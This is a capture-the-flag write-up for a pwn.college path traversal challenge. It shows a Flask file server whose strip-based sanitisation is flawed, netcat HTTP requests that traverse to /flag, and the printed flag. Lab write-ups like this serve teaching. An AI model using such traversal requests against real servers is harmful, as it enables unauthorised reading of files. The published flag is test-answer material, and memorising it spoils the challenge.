# Challenge: Path Traversal 2

title: "Path Traversal 2 â€” Writeup"
category: "Web Exploitation"
challenge: "Path Traversal 2"
platform: "pwn.college"
difficulty: "Intermediate"
---

# Path Traversal 2 â€” Writeup

## ğŸ§  Challenge Overview

In this challenge, we are provided with a Python Flask web server which serves files from the `/challenge/files/` directory via the `/data/<path>` endpoint.

The directory structure is as follows:

```
/challenge/
â”œâ”€â”€ DESCRIPTION.md
â”œâ”€â”€ files/
â”‚   â”œâ”€â”€ index.html
â”‚   â””â”€â”€ fortunes/
â”‚       â”œâ”€â”€ fortune-1.txt
â”‚       â”œâ”€â”€ fortune-2.txt
â”‚       â””â”€â”€ fortune-3.txt
â””â”€â”€ server
```

## ğŸ” Server Code Analysis

The vulnerable server code is as follows:

```python
@app.route("/data", methods=["GET"])
@app.route("/data/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))
```

The key vulnerability lies in this line:

```python
requested_path = app.root_path + "/files/" + path.strip("/.")
```

The `strip("/.")` does not properly sanitize path traversal attempts like `../../../flag`, since `strip` only removes leading and trailing characters â€” not sequences or intermediate components.

## ğŸ¯ Exploitation Steps

### Step 1: Basic request
```bash
printf "GET /data HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
Response confirms access to `index.html` and links to available fortunes.

### Step 2: Attempt to access the directory itself (Fails)
```bash
printf "GET /data/fortunes HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
Returns `500 Internal Server Error` because the target is a directory, not a file.

### Step 3: Try Path Traversal
```bash
printf "GET /data/fortunes/../../../flag HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
âœ… Returns the flag:
```
pwn.college{oDarDRBzk56F2i1vM_ERNz7PJ7U.QXyYTN2wSM0IzMyEzW}
```


## ğŸ Flag

```
pwn.college{oDarDRBzk56F2i1vM_ERNz7PJ7U.QXyYTN2wSM0IzMyEzW}
```


